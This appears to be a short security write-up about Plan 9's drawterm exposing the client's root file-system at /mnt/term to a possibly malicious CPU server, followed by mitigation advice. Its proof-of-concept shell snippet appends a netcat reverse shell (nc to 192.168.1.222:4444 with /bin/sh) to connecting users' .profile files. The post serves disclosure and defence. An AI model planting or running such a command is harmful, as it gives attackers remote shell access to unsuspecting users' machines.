**Background**<br />
While there are SSH clients in Plan 9, connecting to a Plan 9 machine in a way that allows you to run programs on that system (like an SSH connection) is typically done via drawterm (for Windows, Linux, OS X, etc) or rcpu (for other Plan 9 machines). One notable difference is the mount to “/mnt/term/” that will appear on the remote Plan 9 server. This usually consists of a mount to the (default root) file-system of the client, and allows easy transfers of files between the server and client.

The “/mnt/term/” mount is done in the name-space of the running connections, and the mount to the and individual client’s file-system would not be available to other connected clients. However, if a CPU server was compromised, or a user was tricked into connecting to an malicious CPU server, a lib/profile (or a compromised executable called by lib/profile) could be crafted that would have access to the clients file-system in the context of the connecting user.

**Proof of Concept**<br />
A reverse shell could be appended to a lib/profile:

    cpu% cat lib/profile
    bind -a $home/bin/rc /bin
    ...
    for (i in `{ls /mnt/term/home/}) {
       if ( test -w $i/.profile ) {
  	      echo 'nc 192.168.1.222 4444 -c /bin/sh &' >> $i/.profile
        }
    }

If someone connects to this account (and they are running a normal Linux distro), a reverse shell will be appended to thier profile. When the user logs out and on again, this reverse shell will connect back to an attacking machine (192.168.1.222 port 4444, in this case).

**Mitigation**<br />
Users of the 9front’s drawterm can mitigate this issue with the “-r” option, which allows users to specify the root of a local file-system to be mounted:

/opt/drawterm/drawterm -a 9front.lan -h 9front.lan -u glenda -r /home/jgstratton/plan9/

I believe the default behavior of 9front’s drawterm shouldn’t mount “/” by default. It should either force user to use the “-r” option if they want this behavior, or maybe create a custom directory in /tmp/ for use in drawterm’s name-space. However: 
1. There are historic/Plan 9 reasons for this “/mnt/term”.
1. “Plan 9” isn't really targeted by malicious people.
1. The issue can be dealt with with the “-r” option.
1. To exploit, an account must already be compromised or a user tricked into connecting into an account that has been constructed for this.

So, in short, I don’t see it as a huge issue. Just something to keep in mind. 
